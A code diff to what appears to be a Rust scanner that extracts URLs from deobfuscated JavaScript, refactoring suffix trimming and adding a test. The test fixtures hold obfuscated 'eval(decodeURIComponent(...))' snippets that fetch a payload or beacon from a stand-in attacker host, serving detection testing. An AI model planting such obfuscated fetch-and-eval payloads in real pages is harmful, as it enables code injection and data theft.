@@ -10119,17 +10119,7 @@ pub fn scan_js_unescape_urls(deobfuscated: &str, env: &mut Environment) {
             let Some(url_m) = url_caps.get(1) else {
                 continue;
             };
-            let mut url = url_m.as_str().to_string();
-            while let Some(last) = url.chars().last() {
-                if matches!(
-                    last,
-                    ',' | '.' | ';' | ':' | ')' | ']' | '}' | '"' | '\'' | '!' | '?' | '\\'
-                ) {
-                    url.pop();
-                } else {
-                    break;
-                }
-            }
+            let url = trim_liberal_url_suffix(url_m.as_str()).to_string();
             if url.len() < 8 || is_noise_url(&url) {
                 continue;
             }
@@ -11778,6 +11768,16 @@ mod js_unescape_url_tests {
         assert!(urls(&script)
             .iter()
             .any(|u| u == "https://attacker-domain.example.io/beacon"));
+    }
+
+    #[test]
+    fn decoded_url_preserves_balanced_bracket_suffix() {
+        let inner = "fetch('https://attacker-domain.example.io/payload[1]');";
+        let script = format!("eval(decodeURIComponent('{}'));", pct(inner));
+        assert_eq!(
+            urls(&script),
+            vec!["https://attacker-domain.example.io/payload[1]".to_string()]
+        );
     }
 
     #[test]
